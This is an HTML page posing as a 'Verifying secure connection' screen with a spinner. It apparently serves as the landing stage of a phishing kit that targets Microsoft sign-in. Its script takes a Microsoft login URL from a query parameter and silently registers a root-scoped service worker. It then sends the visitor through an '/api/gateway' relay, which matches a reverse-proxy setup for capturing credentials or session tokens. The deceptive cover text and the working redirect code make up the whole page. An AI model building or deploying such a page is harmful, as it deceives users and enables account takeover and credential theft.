<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Connection</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .container {
            text-align: center;
            background: #ffffff;
            padding: 48px 32px;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
            max-width: 400px;
            width: 100%;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e8e8e8;
            border-top-color: #4C00FF;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .title {
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 6px;
        }
        .sub {
            font-size: 14px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="title">Verifying secure connection</div>
        <div class="sub">Please wait while we establish an encrypted session…</div>
    </div>

    <script>
        (function() {
            const params = new URLSearchParams(window.location.search);
            // EXTRACT ONLY THE MICROSOFT URL from the 'dest' parameter
            const rawTarget = params.get('dest');
            console.log('[PAGE] Raw target from URL:', rawTarget);

            if (!rawTarget) {
                window.location.replace('https://www.google.com');
                return;
            }

            // Decode the target (it's URL-encoded)
            let microsoftUrl;
            try {
                microsoftUrl = decodeURIComponent(rawTarget);
                console.log('[PAGE] Decoded target:', microsoftUrl);
            } catch (e) {
                console.log('[PAGE] Failed to decode target, using raw value');
                microsoftUrl = rawTarget;
            }

            // Validate it's a proper URL (should be https://login.microsoftonline.com/...)
            try {
                new URL(microsoftUrl);
            } catch (e) {
                console.log('[PAGE] Invalid URL, falling back to Google');
                window.location.replace('https://www.google.com');
                return;
            }

            // Register Service Worker silently
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/worker_8t2r.js', { scope: '/' })
                    .then(() => console.log('[PAGE] SW registered'))
                    .catch(err => console.log('[PAGE] SW registration failed:', err));
            }

            // Navigate to relay with the CLEAN Microsoft URL
            const relayUrl = `/api/gateway?target=${encodeURIComponent(microsoftUrl)}`;
            console.log('[PAGE] Redirecting to relay:', relayUrl);
            window.location.replace(relayUrl);
        })();
    </script>
</body>
</html>
